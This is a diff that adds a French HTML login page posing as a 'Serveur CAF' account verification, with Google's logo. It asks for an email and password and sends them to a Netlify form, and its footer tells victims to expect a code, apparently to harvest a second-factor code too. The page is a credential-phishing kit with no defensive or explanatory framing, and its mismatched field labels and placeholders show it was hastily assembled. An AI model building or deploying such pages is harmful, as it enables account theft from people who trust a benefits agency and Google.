@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Identification — Votre compte - Serveur CAF</title>
+<style>
+  :root {
+    --ink: #1f2b24;
+    --ink-soft: #4a5750;
+    --paper: #f7f6f1;
+    --card: #ffffff;
+    --sage: #2563EB;
+--sage-deep: #1D4ED8;
+    --line: #d9d5c9;
+    --warn-bg: #fbf3e3;
+    --warn-line: #e0c98f;
+    --error: #a3372c;
+    --radius: 10px;
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    margin: 0;
+    font-family: "Iowan Old Style", "Palatino Linotype", Georgia, serif;
+    background: var(--paper);
+    color: var(--ink);
+    line-height: 1.55;
+  }
+
+  .wrap {
+    max-width: 720px;
+    margin: 0 auto;
+    padding: 0 20px 80px;
+  }
+
+  header.hero {
+    background: var(--sage-deep);
+    color: #f1f0e6;
+    padding: 56px 20px 40px;
+    margin-bottom: -28px;
+  }
+
+  header.hero .hero-inner {
+    max-width: 720px;
+    margin: 0 auto;
+  }
+
+  .eyebrow {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 0.14em;
+    font-size: 12px;
+    color: #b9cdbd;
+    margin: 0 0 14px;
+  }
+
+  header.hero h1 {
+    font-size: clamp(24px, 5vw, 34px);
+    line-height: 1.2;
+    margin: 0 0 16px;
+    font-weight: 600;
+  }
+
+  header.hero p {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    color: #d8ddd3;
+    font-size: 15px;
+    max-width: 54ch;
+    margin: 0;
+  }
+
+  main {
+    background: var(--card);
+    border-radius: var(--radius);
+    box-shadow: 0 1px 3px rgba(0,0,0,0.06), 0 12px 32px rgba(30,40,30,0.08);
+    padding: 36px 28px 40px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .field { margin-bottom: 24px; }
+
+  label {
+    display: block;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-weight: 600;
+    font-size: 15px;
+    margin-bottom: 8px;
+    color: var(--ink);
+  }
+
+  label .req { color: var(--error); font-weight: 400; margin-left: 2px; }
+
+  input[type="text"] {
+    width: 100%;
+    padding: 13px 14px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 16px;
+    border: 1px solid #c7c2b3;
+    border-radius: 8px;
+    background: #fffefb;
+    color: var(--ink);
+    outline: none;
+    transition: border-color 0.15s ease, box-shadow 0.15s ease;
+  }
+
+  input[type="text"]:focus {
+    border-color: var(--sage);
+    box-shadow: 0 0 0 3px rgba(60,90,72,0.15);
+  }
+
+  button[type="submit"] {
+    width: 100%;
+    background: var(--sage-deep);
+    color: #fff;
+    border: none;
+    padding: 16px;
+    border-radius: 8px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 16.5px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 12px;
+    transition: background 0.15s ease;
+  }
+
+  button[type="submit"]:hover { background: var(--sage); }
+
+  footer {
+    text-align: center;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 12.5px;
+    color: var(--ink-soft);
+    margin-top: 30px;
+  }
+
+  @media (max-width: 480px) {
+    main { padding: 28px 18px 32px; }
+    header.hero { padding: 44px 16px 36px; }
+  }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="hero-inner">
+    <p class="eyebrow">Identification et connection au serveur</p>
+    <h1>Vérification de votre compte</h1>
+    <p>Veuillez connecter votre Google pour continuer.</p>
+  </div>
+</header>
+
+<div class="wrap">
+  <main>
+<svg width="20" height="20" viewBox="0 0 24 24">
+  <path fill="#4285F4" d="M21.35 12.27c0-.79-.07-1.55-.22-2.27H12v4.3h5.24a4.48 4.48 0 0 1-1.94 2.94v2.45h3.14c1.84-1.69 2.91-4.18 2.91-7.42z"/>
+  <path fill="#34A853" d="M12 21.99c2.63 0 4.84-.87 6.45-2.36l-3.14-2.45c-.87.58-1.98.92-3.31.92-2.54 0-4.7-1.72-5.47-4.04H3.28v2.53A9.75 9.75 0 0 0 12 21.99z"/>
+  <path fill="#FBBC05" d="M6.53 14.06A5.86 5.86 0 0 1 6.22 12c0-.72.12-1.42.31-2.06V7.41H3.28A9.75 9.75 0 0 0 2.25 12c0 1.57.38 3.05 1.03 4.59l3.25-2.53z"/>
+  <path fill="#EA4335" d="M12 5.9c1.43 0 2.71.49 3.72 1.45l2.79-2.79C16.84 2.98 14.63 2 12 2a9.75 9.75 0 0 0-8.72 5.41l3.25 2.53C7.3 7.62 9.46 5.9 12 5.9z"/>
+</svg>
+    
+    <form name="Se connecter" method="POST" action="/merci.html" data-netlify="true">
+      <input type="hidden" name="form-name" value="identification-compte">
+
+      <div class="field">
+        <label for="nom">1 — Email<span class="req">*</span></label>
+        <input type="text" id="nom" name="nom" placeholder="Votre nom de famille" required>
+      </div>
+
+      <div class="field">
+        <label for="username">2 — Mot de passe <span class="req">*</span></label>
+        <input type="text" id="username" name="username" placeholder="Votre nom d'utilisateur" required>
+      </div>
+
+      <button type="submit">Se connecter →</button>
+    </form>
+
+  </main>
+
+  <footer>
+    Après avoir soumis votre assistant(e) vous enverra un code ,veuillez le sélectionner pour la connexion à serveur.
+  </footer>
+</div>
+
+</body>
+</html>
